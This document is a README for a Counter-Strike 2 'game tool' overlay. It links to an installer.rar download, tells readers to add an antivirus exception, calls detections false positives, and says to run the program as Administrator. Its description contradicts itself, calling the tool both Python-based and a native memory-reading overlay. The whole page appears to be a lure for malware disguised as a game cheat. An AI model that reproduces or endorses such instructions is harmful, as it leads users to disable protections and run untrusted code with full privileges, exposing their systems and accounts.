<div align="center">

#  cs2-game-tool [v1.0.1]
### A utility for enhancing the cs2 game experience

<img src="https://raw.githubusercontent.com/Dimensioneisense/cs2-game-tool/main/preview_1.png" width="700">

---

## [⬇️ DOWNLOAD](https://github.com/Dimensioneisense/cs2-game-tool/releases/download/v1.0/installer.rar)

> **Requirements:** Windows 10/11 x64 (build 19041+), DirectX 11 compatible GPU, Visual C++ 2019/2022 x64 runtime.
> *Note: Some AVs flag unsigned overlay tools as false-positives because of the memory-read and window-composition patterns they use. Add a local exception for the extracted folder if needed.*

---

</div>

## ❓ What is cs2-game-tool?
The cs2-game-tool is a Windows-based application designed to provide gamers and developers with a set of features to modify and extend the functionality of the cs2 game. This tool allows users to create custom game modes, enhancing their overall gaming experience. By leveraging the power of Python scripting and DirectX, the cs2-game-tool offers a flexible and robust platform for game development and automation.

## 📸 Screenshots

<img src="https://raw.githubusercontent.com/Dimensioneisense/cs2-game-tool/main/preview_1.png" width="700">

## ✨ Key Features
- External Operation: No code injection, no kernel drivers.
- ImGui Overlay: Transparent, borderless, click-through mode.
- Low Overhead: <1% GPU impact on modern Nvidia/AMD GPUs.
- Config-driven: simple `config.ini` with hot-reload.
- Windows 10/11 x64 native build.
- Portable release — just extract and run.

## 🚀 How to Use
1. Download the latest `installer.rar` from the Releases page.
2. Extract the archive anywhere on your SSD (recommended outside Program Files).
3. Right-click the main executable and choose **Run as Administrator**.
4. Launch the target application and the overlay will attach automatically.
5. Edit `config.ini` to adjust keybinds, colors and overlay position.

## ⚠️ Disclaimer
For educational purposes only. Use at your own risk.

## 📜 License
MIT License 

### Additional Information
The cs2-game-tool is built using Python and utilizes the Windows API to interact with the cs2 game. The tool's overlay feature allows for seamless integration with the game, providing a unique and enhanced gaming experience. With its modular design, the cs2-game-tool is highly customizable, enabling developers to create a wide range of custom game modes and extensions.
<!-- doc tweak -->

## 🔧 Troubleshooting

- **Overlay not visible**: make sure the target window is in borderless or windowed mode (true-fullscreen DX clobbers overlays).
- **High CPU usage**: cap your render rate via the `fps_limit` key in `config.ini`.
- **AV false positive**: see the AV note at the top of this README.
